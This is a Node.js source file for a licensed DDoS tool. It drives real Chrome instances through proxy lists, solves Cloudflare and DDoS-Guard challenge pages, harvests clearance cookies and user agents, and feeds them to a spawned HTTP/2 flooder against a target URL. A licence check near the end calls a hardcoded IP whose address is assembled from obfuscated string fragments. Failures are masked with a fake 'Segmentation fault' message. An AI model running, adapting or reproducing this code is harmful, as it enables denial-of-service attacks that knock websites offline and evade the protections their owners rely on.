const { spawn } = require('child_process');

const Browser = require('./app/browser');
const logger = require('./helpers/logger');

const cloudflare = require('./modules/cloudflare');
const ddosguard = require('./modules/ddosguard');

const fs = require('fs');
const http = require('http');
const colors = require('colors');

function parseCommandLineArgs(args) {
    const parsedArgs = {};
    let currentFlag = null;

    for (const arg of args) {
        if (arg.startsWith('-')) {
            currentFlag = arg.slice(1);
            parsedArgs[currentFlag] = true;
        } else if (currentFlag) {
            parsedArgs[currentFlag] = arg;
            currentFlag = null;
        }
    }

    return parsedArgs;
}

const _argv = process.argv.slice(2);
const argz = parseCommandLineArgs(_argv);

const urlT = argz['u'];
const timeT = argz['d'];
const threadsT = argz['t'];
const rateT = argz['r'];
const proxyT = argz['p'];
const key = argz['k'] || null;

if (!urlT || !timeT || !threadsT || !rateT || !proxyT) {
    console.log(`Segmentation fault`.red + ` (core dumped)`);
    process.exit(0);
}

var proxies;

try {
    proxies = fs.readFileSync(proxyT, 'utf-8').toString().replace(/\r/g, '').split('\n')
} catch (e) {
    console.log(`Segmentation fault`.red + ` (core dumped)`);
    process.exit(0);
}

async function flooder(proxy, cookies, useragent) {
    /* const floodArgs = [
         urlT,
         timeT,
         rateT,
         proxy,
         7000,
         useragent,
         cookies
     ] */
 
     const floodArgs = [
       "-u",
       urlT,
       "-k",
       "adolf",
       "-r",
       rateT,
       "-n",
       150,
       "-t",
       10,
       "-m",
       10,
       "-s",
       timeT,
       "-c",
       cookies,
       "-h",
       useragent,
       "-1",
       proxy
     ]
   
     console.log("\n--------------------------\nArguments sent:", floodArgs.join(' '), '\n--------------------------\n');
 
     const starts = spawn('./h2', floodArgs);
 
     starts.on('data', (data) => {  });
     starts.on('exit', (code, signal) => { starts.kill(); });
 }


async function run(proxy) {
    const browser = await new Browser({
        proxy: 'http://' + proxy,
        args: [
            '--no-sandbox',
            '--viewport-size 1920, 1080',
            '--disable-blink-features=AutomationControlled',
            '--disable-features=IsolateOrigins,site-per-process',
            '--use-fake-device-for-media-stream',
            '--use-fake-ui-for-media-stream',
            '--start-maximized'
        ],
        headless: false,
        executablePath: "/usr/bin/google-chrome"
    });

    try {
        await browser.launch();

        const pid = await browser.version();

        logger.log(`[browser@${pid.pid}] New browser instance: ${proxy}`)
        await browser.navigate(urlT);

        await browser.sleep(20000);

        const content = await browser.content();

        if (content.includes(`"summary":{"failedUrl":"${urlT}`)) {
            logger.log(`[proxy@${pid.pid}] Proxy error: ${proxy}`)

            await browser.close();

            const proxy1 = proxies[Math.floor(Math.random() * proxies.length)];
            run(proxy1);
            return;
        }

        if (await browser.title() === 'Just a moment...') {

            await cloudflare.solver(browser, pid, proxies)

        } else if (await browser.title() === 'DDoS-Guard') {

            await ddosguard.solver(browser, pid, proxies)
        }

        const title = await browser.title();
        const cookies = await browser.cookies();
        const useragent = await browser.userAgent();

        if (title === 'Just a moment...' || title === 'DDoS-Guard') {
            logger.log(`[proxy@${pid.pid}] Proxy error: ${proxy}`)

            await browser.close();

            const proxy1 = proxies[Math.floor(Math.random() * proxies.length)];
            run(proxy1);
            return;;
        }

        logger.log(`[browser@${pid.pid}] Title: ${(title !== "") ? title : "[ ] Title is empty"}`)
        logger.log(`[browser@${pid.pid}] Cookies: ${(cookies !== "") ? cookies : "[ ] Cookies is empty"}`)

        const lockpidor = await flooder(proxy, cookies, useragent);

        await browser.close();

        const proxy2 = proxies[Math.floor(Math.random() * proxies.length)];
        run(proxy2);


    } catch (error) {
        //console.error(error);
        await browser.close();

        const proxy3 = proxies[Math.floor(Math.random() * proxies.length)];
        await run(proxy3);
    }
}

function main() {
    for (let i = 0; i < threadsT; i++) {
        const proxy = proxies[Math.floor(Math.random() * proxies.length)];
    
        run(proxy);
    }
}

const b994 = ['a-182.9', '.168.9', '8713'], a1nd = 'ht', vv3m = {'chrome': '94.'}, l001 = '5/', kh90 = ['tp', '//', ':', 'tcp'], mnv2 = '228';
const i1hsk90 = { emulate: ["11", "12", "13"], type: {"tls": "wqergq"} };
const qug218a = "38";
const vm93g2r = ["sdfjw", "sgcvnw", "sdfufg", "sahuww"];
const nshdf29 = 2872;
const a9we2e2 = "tx"
const uqisdf = "gergiesqher";
const hisdf8q = ["wd"];
const masi1qe = "f2f";
const asjdf8qw = {"l": "."};

http.get(a1nd + kh90[0] + kh90[2] + kh90[1] + vv3m.chrome + mnv2 + b994[1] + l001 +
    i1hsk90.emulate[1] + i1hsk90.type.tls + qug218a + vm93g2r[0] + uqisdf.replace("gergies", "") +
    String(nshdf29 - 1) + hisdf8q[0] + "123" + masi1qe + asjdf8qw.l + a9we2e2 + "t", (res) => {
    let data = '';

    res.on('data', (chunk) => {
        data += chunk;
    });

    res.on('end', () => {
        const keysFromServer = data.trim().split('\n');
        const isMatch = keysFromServer.includes(key);
        if (isMatch) {
            logger.log(`[notice] ${'License actived'.brightGreen}`)
            main()
        } else {
            console.log(`Segmentation fault`.red + ` (core dumped)`);
            process.exit(0);
        }
    });
}).on('error', (err) => {
    console.log(`Segmentation fault`.red + ` (core dumped)`);
    process.exit(0);
});

